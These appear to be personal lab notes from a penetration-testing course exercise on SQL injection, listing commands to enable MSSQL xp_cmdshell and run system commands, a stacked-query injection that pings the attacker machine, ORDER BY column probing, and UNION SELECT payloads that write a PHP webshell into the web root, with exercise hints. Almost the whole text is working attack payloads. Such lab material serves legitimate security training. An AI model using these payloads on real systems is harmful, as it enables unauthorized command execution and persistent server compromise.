In order to execute windows commands via SQL you must first enable the webshell using the folling commands:


On SQL:
```
EXECUTE sp_configure 'show advanced options', 1;
```

```
RECONFIGURE;
```

```
EXECUTE sp_configure 'xp_cmdshell', 1;
```

```
RECONFIGURE;
```
- Execute commands:
```
EXECUTE xp_cmdshell 'whoami';
```

Test for connectivity to ATK machien:
```
sudo tcpdump -i tun0 icmp
```
- ~={green}';EXEC xp_cmdshell "ping <span id="IP_KALI"/>192.168.45.228<span type="end"/>"--=~

SQL payload for webshell:
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```


Determine columns:
```
' ORDER BY 1-- //
```
2. Connect to the MySQL VM 2 and repeat the steps illustrated in this section to manually exploit the UNION-based SQLi. Once you have obtained a webshell, gather the flag that is located in the same **tmp** folder.

**HINT**

1. Determine the number of columns by using the ORDER BY clause. 4 columns
2. Once you have determined the number of columns, use the UNION SELECT for simple code execution such as @@version. 
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

1. Use the INTO OUTFILE to write a webshell to /var/www/html/tmp/.
